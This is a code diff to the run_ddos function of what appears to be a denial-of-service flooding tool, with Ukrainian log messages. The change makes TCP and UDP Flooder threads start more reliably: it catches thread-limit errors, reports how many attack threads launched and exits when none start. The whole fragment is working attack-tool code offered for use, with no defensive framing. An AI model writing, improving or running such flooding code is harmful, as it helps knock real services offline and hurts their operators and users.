@@ -167,15 +167,46 @@ def run_ddos(
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
 
     threads = []
+    # run threads for all targets with TCP port
     for _ in range(total_threads):
         flooder = Flooder(event, kwargs_list, work_stealing_cycles)
-        flooder.start()
-        threads.append(flooder)
-    if udp_kwargs_list:
-        for _ in range(udp_threads):
-            flooder = Flooder(event, udp_kwargs_list, work_stealing_cycles)
+        try:
             flooder.start()
             threads.append(flooder)
+        except RuntimeError:
+            break
+
+    if not threads:
+        logger.warning(
+            f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
+        exit()
+
+    if len(threads) < total_threads:
+        logger.warning(
+            f"{cl.RED}Не вдалося запустити усі {total_threads} потоків - "
+            f"лише {len(threads)}{cl.RESET}")
+
+    # run threads for all targets with UDP port (if any)
+    if udp_kwargs_list:
+        udp_threads_started = 0
+        for _ in range(udp_threads):
+            flooder = Flooder(event, udp_kwargs_list, work_stealing_cycles)
+            try:
+                flooder.start()
+                threads.append(flooder)
+                udp_threads_started += 1
+            except RuntimeError:
+                break
+
+        if udp_threads_started == 0:
+            logger.warning(
+                f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
+            exit()
+
+        if udp_threads_started < udp_threads:
+            logger.warning(
+                f"{cl.RED}Не вдалося запустити усі {udp_threads} потоків під UDP - "
+                f"лише {udp_threads_started}{cl.RESET}")
 
     event.set()
 
